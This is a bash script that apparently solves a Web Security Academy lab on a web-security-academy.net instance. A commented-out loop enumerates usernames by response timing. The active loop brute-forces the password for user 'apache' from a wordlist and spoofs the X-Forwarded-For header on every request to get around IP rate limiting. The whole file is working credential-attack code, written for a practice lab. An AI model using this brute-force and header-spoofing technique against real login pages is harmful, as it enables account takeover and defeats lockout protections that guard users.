#!/bin/bash

fake_ip=999999

#while read USERNAME; do
#    timing=$(curl -w %{time_total} -o /dev/null -s -k -d "username=$USERNAME&password=asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf" -H "Cookie: session=XNhAzA2gTHoE121SYHbVpkoAgSDy7XNT" -H "X-Forwarded-For: $fake_ip" -X POST "https://0a08001e048beb74c08ceb4c00ed0070.web-security-academy.net/login")
#    timing=`echo $timing | cut -d. -f1`
#    if [ $timing -gt "0" ]; then
#    echo $timing $USERNAME
#    fi
#    let fake_ip++
#done < ./usernames.txt


while read PASSWORD; do
    code=$(curl -w "%{http_code}\n" -o /dev/null -s -k -d "username=apache&password=$PASSWORD" -H "Cookie: session=XNhAzA2gTHoE121SYHbVpkoAgSDy7XNT" -H "X-Forwarded-For: $fake_ip" -X POST "https://0a08001e048beb74c08ceb4c00ed0070.web-security-academy.net/login")
    if [ $code -eq "302" ];then
    echo $code $PASSWORD
    else
        echo -n "."
    fi
    let fake_ip++
done < ./passwords.txt
